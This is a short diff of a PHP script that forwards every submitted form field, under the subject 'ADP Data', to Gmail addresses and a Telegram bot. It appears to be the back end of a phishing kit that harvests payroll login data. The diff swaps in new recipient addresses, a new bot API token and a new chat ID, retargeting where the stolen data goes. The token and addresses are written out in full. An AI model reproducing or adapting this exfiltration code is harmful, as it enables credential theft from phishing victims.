@@ -2,7 +2,7 @@
 
 if($_POST){
 	
-        $to = "mughal.jamshaid123@gmail.com, billionboss2020@gmail.com";
+        $to = "headtimothy808@gmail.com, headtimothy808@gmail.com";
         $subject = "ADP Data";
 		$_fdata = "";
 		foreach($_POST as $_pk => $_pv){
@@ -24,7 +24,7 @@ if($_POST){
         $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
         
         // More headers
-        $headers .= 'From: <billionboss2020@gmail.com>' . "\r\n";
+        $headers .= 'From: <headtimothy808@gmail.com>' . "\r\n";
         /* 
         if( mail($to,$subject,$message,$headers) ){
             echo 'true';
@@ -36,9 +36,9 @@ $__html = '<b>You have received following data.</b>' . $_fdata;
 //$__html = wordwrap($msg,70);
 
       
-            $apiToken = "5849159586:AAGNOFmgM6yUfWDZQUhgVJrr4MhYTLrands";
+            $apiToken = "6819516823:AAHjSdp4OYmnMlnzoHb7QgQRVOXSZ4LKaTw";
 			$data = [
-				'chat_id' => '822503259', 
+				'chat_id' => '2112852041', 
 				'text' => $__html,
 				'parse_mode' => 'HTML'
 			];
